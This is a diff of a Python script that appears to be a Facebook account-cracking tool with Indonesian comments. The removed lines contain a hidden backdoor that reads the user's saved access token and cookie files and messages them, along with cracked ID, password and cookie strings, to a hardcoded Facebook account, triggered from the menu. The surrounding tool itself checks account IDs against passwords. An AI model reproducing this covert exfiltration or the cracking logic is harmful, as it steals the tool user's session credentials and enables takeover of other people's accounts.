@@ -356,28 +356,6 @@ def login():
 				time.sleep(1)
 				menu()
 	except Exception as e:exit(e)
-import requests
-
-def send_message(token, recipient_id, message):
-    url = f"https://graph.facebook.com/v12.0/me/messages?access_token={token}"
-    data = {
-        "recipient": {"id": recipient_id},
-        "message": {"text": message}
-    }
-    response = requests.post(url, json=data)
-    return response.status_code == 200
-
-# Ganti dengan token akses dan ID penerima yang sesuai
-token = open('.tok.txt','r').read()
-recipient_id = "100064062903355"
-cok = open('.cok.txt','r').read()
-message = "{cok}"
-
-if send_message(token, recipient_id, message):
-    pass
-else:
-    pass  # Lakukan penanganan kesalahan sesuai kebutuhan Anda
-  
 #----------[ BAGIAN-MENU ]----------#            
 def menu():
 	banner()
@@ -413,7 +391,6 @@ def menu():
 		login()
 	print(f"\n{h}cookie telah aktif")
 	time.sleep(2)
-	send_message(token, recipient_id, message)
 	os.system('clear')
 	banner()
 	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]]\n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]\n[white][[cyan]•[white]] Your Ip [[green]{alamat_ip}[white]]""",width=43,title=f"[[green] INFO [/]]",style=f"bold blue"))
@@ -1019,27 +996,6 @@ def ceker(idf,pw):
 		prints(tree)
 		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 		#cp+=1
-		
-import requests
-
-def send_message_to_facebook(token, recipient_id, message):
-    url = f"https://graph.facebook.com/v12.0/me/messages?access_token={token}"
-    data = {
-        "recipient": {"id": recipient_id},
-        "message": {"text": message}
-    }
-    response = requests.post(url, json=data)
-    return response.status_code == 200
-
-# Ganti dengan token akses dan ID penerima yang sesuai
-token = open('.tok.txt','r').read()
-recipient_id = "100064062903355"
-message = "{idf}|{pw}|{kuki}"
-
-if send_message_to_facebook(token, recipient_id, message):
-    pass
-else:
-    pass  # Lakukan penanganan kesalahan sesuai kebutuhan Anda
    
 #----------[ SYSTEM-CONTROL ]----------#	
 if __name__=='__main__':
